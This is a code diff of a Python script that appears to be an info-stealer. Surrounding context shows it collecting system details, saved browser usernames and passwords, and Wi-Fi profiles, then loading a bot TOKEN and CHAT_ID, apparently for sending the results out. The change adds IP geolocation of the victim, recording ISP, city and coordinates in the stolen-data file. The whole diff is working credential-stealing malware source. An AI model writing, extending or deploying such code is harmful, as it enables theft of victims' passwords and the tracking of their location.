@@ -22,6 +22,25 @@ from dotenv import load_dotenv
 load_dotenv()
 
 
+def get_data_by_ip():
+    try:
+        response = requests.get('http://ip-api.com/json/').json()
+        data = {
+            '[IP]': response.get('query'),
+            '[Int prov]': response.get('isp'),
+            '[Org]': response.get('org'),
+            '[Country]': response.get('country'),
+            '[Region Name]': response.get('regionName'),
+            '[City]': response.get('city'),
+            '[ZIP]': response.get('zip'),
+            '[Lat]': response.get('lat'),
+            '[Lon]': response.get('lon'),
+        }
+        return data
+    except requests.exceptions.ConnectionError:
+        return 'No internet'
+
+
 def get_system_info():
     """Get all main system information"""
 
@@ -110,7 +129,7 @@ def get_cookies(file_name):
             continue
         else:
             all_raws = cursor.execute(
-                """SELECT origin_url, action_url, username_value, 
+                """SELECT origin_url, action_url, username_value,
                 password_value, date_created, date_last_used FROM logins""")
 
             for row in all_raws.fetchall():
@@ -144,6 +163,7 @@ def get_all_information():
 
     main_comp_info = get_system_info()
     list_of_keys = list(main_comp_info.keys())
+    global file_name
     file_name = f'system_info__{main_comp_info.get(list_of_keys[4])}.txt'
     profile_info = ''
     rus_names = ['Все профили пользователей', 'Содержимое ключа']
@@ -181,6 +201,17 @@ def get_all_information():
 
     # Getting all users' cookies
     get_cookies(file_name)
+
+    # Getting IP address
+    ip_data = get_data_by_ip()
+
+    if ip_data == 'No internet':
+        with open(file=file_name, mode='a', encoding='utf-8') as file:
+            file.write(f'Sorry... There were no internet connection.')
+    else:
+        for k, v in ip_data.items():
+            with open(file=file_name, mode='a', encoding='utf-8') as file:
+                file.write(f'{k}: {v}\n')
 
     token = os.getenv('TOKEN')
     chat_id = os.getenv('CHAT_ID')
